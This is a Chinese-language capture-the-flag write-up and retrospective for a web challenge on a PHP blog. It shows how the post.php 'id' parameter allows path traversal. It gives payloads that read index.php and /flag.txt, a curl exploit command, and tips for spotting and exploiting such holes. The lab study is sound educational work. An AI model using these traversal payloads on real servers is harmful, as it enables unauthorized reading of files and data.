## 题解

### 入口与指纹

`Apache/2.4.54 (Debian)` + `PHP/7.4.33`，首页是一个静态博客 `Encoder64 Blog`，
文章链接形状是：

```html
<a href="post.php?id=EternalBlue.php">
```

`id` 的值看起来就是文件名（带 `.php` 后缀），而不是数据库主键。

### 关键观察

**1. `id` 直接被当成文件路径读取，没有任何过滤。**

- `id=EternalBlue.php` → 正常文章。
- `id=../index.php` → 返回首页完整 HTML，说明 `../` 生效，读取目录是站点的子目录。
- `id=../../../../flag.txt` → 直接返回 flag。

不存在的路径统一返回 `<p>Post not found.</p>` 加一份 5.3KB 的错误页。
**「Post not found」是应用层结果，不是 403/404 过滤**，所以可以拿它当
「文件是否存在」的 oracle 来数层级。

**2. 层级要对，过滤本身不存在。**

| `id` | 结果 |
| --- | --- |
| `../flag.txt` / `../../flag.txt` / `../../../flag.txt` | `Post not found.`（路径不存在） |
| `../../../../flag.txt` | **flag**（就是 `/flag.txt`） |
| `../index.php` | 200，返回站点首页 |

也就是说：从文章目录回到 `/` 需要 4 层，flag 在文件系统根目录。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get --data-urlencode 'id=../../../../flag.txt' \
  "http://$T/post.php" | grep -o 'flag{[^}]*}'
# flag{b8dfe865-7f15-43d3-97b8-e8f2a5b8bd9b}
```

### flag 位置

`/flag.txt`（文件系统根目录），经 `post.php?id=` 的路径穿越读取。

## 复盘

- **`?id=<文件名>` 的形态就是路径穿越候选。** 参数里带扩展名（`.php`）时，
  它更可能是文件名而不是主键；先试 `../index.php` 一次，能读到就说明有穿越。
- **错误文案区分「过滤」和「不存在」。** 本题所有失败都是 `Post not found.`，
  没有 403、没有「非法字符」；这说明过滤根本没做，只是文件不存在。
- **数层级用已知文件。** 先用 `../index.php` 确认起点，再逐级加 `../` 找 `/flag.txt`；
  比猜文件名快。
- **flag 不一定在 Web 根目录。** 这里要跨 4 层到 `/`；`../flag.txt` 失败不代表穿越失败。
